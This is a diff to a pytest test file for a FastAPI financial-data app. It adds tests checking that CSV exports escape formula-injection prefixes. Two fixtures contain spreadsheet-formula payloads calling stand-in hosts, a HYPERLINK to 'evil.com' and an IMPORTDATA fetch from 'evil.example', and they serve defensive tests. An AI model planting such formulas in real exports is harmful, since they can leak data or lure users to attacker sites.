@@ -14,6 +14,7 @@ os.environ.setdefault("APP_SECRET_KEY", "test-secret-key")
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 import api  # noqa: E402
+from routers.market import _csv_safe  # noqa: E402
 
 client = TestClient(api.app)
 
@@ -142,6 +143,26 @@ class TestDbCompanyDrilldown:
         assert client.get("/api/db/company/E99999").status_code == 404
 
 
+# ── _csv_safe ────────────────────────────────────────────────────────────────
+
+class TestCsvSafe:
+    @pytest.mark.parametrize("raw,expected", [
+        ("=SUM(A1)", "'=SUM(A1)"),
+        ("+1234",   "'+1234"),
+        ("-1",      "'-1"),
+        ("@foo",    "'@foo"),
+        ("\t注入",  "'\t注入"),
+        ("\r注入",  "'\r注入"),
+        ("普通のテキスト", "普通のテキスト"),
+        ("",        ""),
+        (42,        42),
+        (3.14,      3.14),
+        (None,      None),
+    ])
+    def test_sanitizes_dangerous_prefix(self, raw, expected):
+        assert _csv_safe(raw) == expected
+
+
 # ── /api/db/export/{table} ──────────────────────────────────────────────────
 
 class TestDbExport:
@@ -152,11 +173,20 @@ class TestDbExport:
         assert "edinet_code" in r.text
         assert "E00001" in r.text
 
+    def test_formula_prefix_is_escaped(self, db, make_company):
+        db.add(make_company(name="=HYPERLINK(\"evil.com\",\"click\")")); db.commit()
+        r = client.get("/api/db/export/companies")
+        assert r.status_code == 200
+        assert "'=HYPERLINK" in r.text
+
     def test_unknown_table_returns_404(self):
         assert client.get("/api/db/export/pg_user").status_code == 404
 
-    def test_invalid_limit_returns_400(self):
+    def test_invalid_limit_zero_returns_400(self):
         assert client.get("/api/db/export/companies?limit=0").status_code == 400
+
+    def test_invalid_limit_over_max_returns_400(self):
+        assert client.get("/api/db/export/companies?limit=10001").status_code == 400
 
     def test_numeric_col_with_non_numeric_filter_returns_400(self):
         r = client.get("/api/db/export/financial_records?filter_col=year&filter_val=abc")
@@ -171,3 +201,9 @@ class TestExportCsv:
         r = client.get("/api/export/csv")
         assert r.status_code == 200
         assert "証券コード" in r.text
+
+    def test_company_name_formula_is_escaped(self, db, make_metric):
+        db.add(make_metric(company_name="=IMPORTDATA(\"http://evil.example\")")); db.commit()
+        r = client.get("/api/export/csv")
+        assert r.status_code == 200
+        assert "'=IMPORTDATA" in r.text
